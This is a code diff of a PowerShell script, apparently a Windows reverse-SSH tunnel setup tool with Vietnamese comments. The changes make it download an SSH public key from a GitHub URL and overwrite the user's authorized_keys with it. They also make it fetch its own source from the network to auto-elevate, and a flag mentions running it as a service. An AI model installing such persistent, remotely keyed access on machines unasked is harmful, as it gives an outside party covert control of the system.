@@ -12,8 +12,8 @@ $RemotePort = 2222                # Port mở trên máy System
 
 # Tự động lấy tên User hiện tại (hoặc thay bằng "Administrator" nếu cần)
 $SystemUser = $env:USERNAME
-$PubKeyUrl  = "ĐIỀN_LINK_RAW_PUBLIC_KEY_ID_RSA.PUB_CỦA_ANH_VÀO_ĐÂY"
-$GistUrl    = "ĐIỀN_LINK_GIST_RAW_CỦA_CHÍNH_FILE_NÀY_VÀO_ĐÂY_ĐỂ_AUTO_ELEVATE"
+$PubKeyUrl  = "https://raw.githubusercontent.com/mphanthj-bot/ssh-reverse-tunnel/main/id_ed25519.pub" # Nguồn public key trên GitHub (thay vì Gist)
+$GistUrl    = "https://raw.githubusercontent.com/mphanthj-bot/ssh-reverse-tunnel/main/WinReverseSSH.ps1" # URL script dùng cho auto-elevate
 $UseNSSM = $true             # Sử dụng NSSM tạo Service thay vì Scheduled Task (cần cài NSSM trước)
 # =======================================================================
 
@@ -49,7 +49,20 @@ Try {
     if (!(Test-Path $sshDir)) { New-Item -ItemType Directory -Path $sshDir -Force | Out-Null }
     
     $authKeysPath = "$sshDir\authorized_keys"
-    Invoke-WebRequest -Uri $PubKeyUrl -OutFile $authKeysPath -UseBasicParsing
+    try {
+        Invoke-WebRequest -Uri $PubKeyUrl -OutFile $authKeysPath -UseBasicParsing -ErrorAction Stop
+        Write-Host "Đã tải public key từ GitHub repo." -ForegroundColor Cyan
+    } catch {
+        # Fallback: dùng file master.pub cạnh script (nếu URL không khả dụng)
+        $masterPubPath = Join-Path $PSScriptRoot 'master.pub'
+        if (Test-Path $masterPubPath) {
+            $key = (Get-Content $masterPubPath -Raw).Trim()
+            Set-Content $authKeysPath $key
+            Write-Host "Không thể tải từ URL, dùng file master.pub cạnh script." -ForegroundColor Yellow
+        } else {
+            Write-Warning "Không tìm thấy file master.pub và URL cũng lỗi."
+        }
+    }
 
     # Sửa quyền siêu chặt chẽ cho file authorized_keys (Windows OpenSSH yêu cầu cái này)
     icacls $authKeysPath /inheritance:r /quiet
